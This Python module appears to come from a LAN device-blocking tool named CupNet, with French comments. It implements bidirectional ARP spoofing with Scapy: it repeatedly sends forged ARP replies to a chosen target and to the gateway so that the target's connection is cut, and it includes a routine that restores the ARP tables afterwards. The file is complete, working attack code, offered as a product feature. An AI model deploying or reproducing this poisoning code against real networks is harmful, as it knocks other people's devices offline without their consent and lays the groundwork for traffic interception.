import threading
import time

from app.blockers.base import BaseBlocker
from app.core.network_utils import (
    get_default_gateway,
    get_iface_hardware_mac,
    resolve_scapy_iface,
)
from app.models.device import BlockMethod

_active_threads: dict[str, threading.Thread] = {}
_stop_flags: dict[str, threading.Event] = {}
_ready_flags: dict[str, threading.Event] = {}
_errors: dict[str, str] = {}


def _key(ip: str, mac: str) -> str:
    return f"{ip}:{mac}"


class ArpSpoofBlocker(BaseBlocker):
    """
    Coupure réseau via ARP spoofing bidirectionnel.

    Fait croire à la cible et à la box que l'autre se trouve sur notre MAC,
    sans relayer le trafic — la connexion est réellement coupée.
    """

    method = BlockMethod.ARP_SPOOF
    label = "Coupure réseau (ARP)"
    description = (
        "Empoisonne les tables ARP de la cible et de la box/routeur pour "
        "couper fortement sa connexion. Méthode la plus efficace sur un LAN. "
        "Nécessite les droits administrateur et Npcap/WinPcap."
    )
    requires_admin = True

    def _send_poison(
        self,
        iface: str,
        our_mac: str,
        target_mac: str,
        gateway_mac: str,
        target_ip: str,
        gateway_ip: str,
    ) -> None:
        from scapy.all import ARP, Ether, sendp  # type: ignore[import-untyped]

        # Cible : la box est sur notre MAC (on ne relaie pas)
        to_target = Ether(src=our_mac, dst=target_mac) / ARP(
            op=2,
            hwsrc=our_mac,
            psrc=gateway_ip,
            hwdst=target_mac,
            pdst=target_ip,
        )
        # Box : la cible est sur notre MAC
        to_gateway = Ether(src=our_mac, dst=gateway_mac) / ARP(
            op=2,
            hwsrc=our_mac,
            psrc=target_ip,
            hwdst=gateway_mac,
            pdst=gateway_ip,
        )
        sendp([to_target, to_gateway], iface=iface, verbose=0, inter=0.01, count=3)

    def _run_spoof(
        self,
        ip: str,
        mac: str,
        stop_event: threading.Event,
        ready_event: threading.Event,
    ) -> None:
        key = _key(ip, mac)
        try:
            from scapy.all import getmacbyip  # type: ignore[import-untyped]
            from scapy.config import conf  # type: ignore[import-untyped]

            conf.verb = 0

            gateway_ip = get_default_gateway()
            if not gateway_ip:
                raise RuntimeError("Passerelle introuvable (route print).")

            target_mac = mac.upper().replace("-", ":")
            gateway_mac = getmacbyip(gateway_ip)
            if not gateway_mac:
                raise RuntimeError(
                    f"Impossible de résoudre la MAC de la passerelle ({gateway_ip}). "
                    "Relancez un scan réseau."
                )
            gateway_mac = gateway_mac.upper().replace("-", ":")

            iface = resolve_scapy_iface()
            our_mac = get_iface_hardware_mac(iface)
            if not our_mac or our_mac == "00:00:00:00:00:00":
                raise RuntimeError(
                    "Impossible de lire la MAC de votre carte réseau. "
                    "Relancez CupNet en administrateur."
                )

            # Premier burst pour valider l'envoi réel sur l'interface
            self._send_poison(
                iface, our_mac, target_mac, gateway_mac, ip, gateway_ip
            )
            ready_event.set()

            while not stop_event.is_set():
                self._send_poison(
                    iface, our_mac, target_mac, gateway_mac, ip, gateway_ip
                )
                stop_event.wait(0.2)

        except ImportError:
            _errors[key] = "Scapy/Npcap manquant. Installez scapy + Npcap (npcap.com)."
        except Exception as exc:
            _errors[key] = str(exc)
        finally:
            ready_event.set()

    def block(self, ip: str, mac: str) -> None:
        key = _key(ip, mac)
        if key in _active_threads and _active_threads[key].is_alive():
            return

        stop_event = threading.Event()
        ready_event = threading.Event()
        _stop_flags[key] = stop_event
        _ready_flags[key] = ready_event
        _errors.pop(key, None)

        thread = threading.Thread(
            target=self._run_spoof,
            args=(ip, mac, stop_event, ready_event),
            daemon=True,
        )
        _active_threads[key] = thread
        thread.start()

        if not ready_event.wait(timeout=8):
            stop_event.set()
            thread.join(timeout=2)
            raise RuntimeError(
                "ARP spoofing n'a pas démarré à temps. Lancez en administrateur avec Npcap."
            )

        if key in _errors:
            err = _errors.pop(key)
            stop_event.set()
            thread.join(timeout=2)
            raise RuntimeError(err)

        if not thread.is_alive():
            err = _errors.pop(key, "Le thread ARP s'est arrêté immédiatement.")
            raise RuntimeError(err)

    def unblock(self, ip: str, mac: str) -> None:
        key = _key(ip, mac)
        if key in _stop_flags:
            _stop_flags[key].set()
        if key in _active_threads:
            _active_threads[key].join(timeout=5)
            del _active_threads[key]
        _stop_flags.pop(key, None)
        _ready_flags.pop(key, None)
        _errors.pop(key, None)

        try:
            from scapy.all import ARP, Ether, getmacbyip, sendp  # type: ignore[import-untyped]

            gateway_ip = get_default_gateway()
            if not gateway_ip:
                return

            target_mac = mac.upper().replace("-", ":")
            gateway_mac = getmacbyip(gateway_ip)
            if not gateway_mac:
                return
            gateway_mac = gateway_mac.upper().replace("-", ":")

            iface = resolve_scapy_iface()
            our_mac = get_iface_hardware_mac(iface)

            restore_target = Ether(src=our_mac, dst=target_mac) / ARP(
                op=2,
                hwsrc=gateway_mac,
                psrc=gateway_ip,
                hwdst=target_mac,
                pdst=ip,
            )
            restore_gateway = Ether(src=our_mac, dst=gateway_mac) / ARP(
                op=2,
                hwsrc=target_mac,
                psrc=ip,
                hwdst=gateway_mac,
                pdst=gateway_ip,
            )
            for _ in range(5):
                sendp([restore_target, restore_gateway], iface=iface, verbose=0)
                time.sleep(0.15)
        except ImportError:
            pass

    def is_active(self, ip: str, mac: str) -> bool:
        key = _key(ip, mac)
        return key in _active_threads and _active_threads[key].is_alive()
